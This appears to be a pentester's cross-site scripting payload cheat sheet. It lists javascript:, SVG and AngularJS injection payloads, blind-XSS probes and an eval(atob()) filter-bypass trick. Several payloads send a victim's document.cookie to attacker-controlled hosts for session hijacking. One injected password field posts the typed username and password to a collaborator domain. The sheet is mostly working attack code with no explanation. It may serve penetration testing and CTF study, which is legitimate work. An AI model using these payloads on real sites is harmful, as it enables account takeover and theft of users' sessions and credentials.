https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
(NodeJS) Rich objects BodyParser extended: true
```
content[key]=value -> {"key":"value"}
```
`javascript:` injection (custom function + error handling)
```javascript
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```
`SVG` `animate` rendering if attributes are blocked
```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
Session Hijacking
```html
<script>new Image().src="http://{attacker IP:port}/?cookie=" + encodeURI(document.cookie);</script>
```
Another payload
```html
<img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
```
Collab Session Hijacking
```html
<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```
Another Session Hijacking
```javascript
function addTheImage() {
  var img = document.createElement('img');
  img.src = 'http://192.168.119.120:9090/' + document.cookie;
  document.body.appendChild(img);
}

addTheImage();
```
Stealing Credentials
```html
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
{ 
	method:'POST', 
	mode: 'no-cors', 
	body:username.value+':'+this.value 
});">
```
# Angular
DOM XSS
```
{{$on.constructor('alert(1)')()}}
```
No strings
```
`1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
```

# Blind XSS
Detection
```html
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```
# WAF Bypass
Base64 encoded
- atob() or btoa()
- if eval blocked: setTimeout(code), setInterval(code), setImmediate(code), Function(code)()
```javascript
eval(atob(<base64_payload>))
```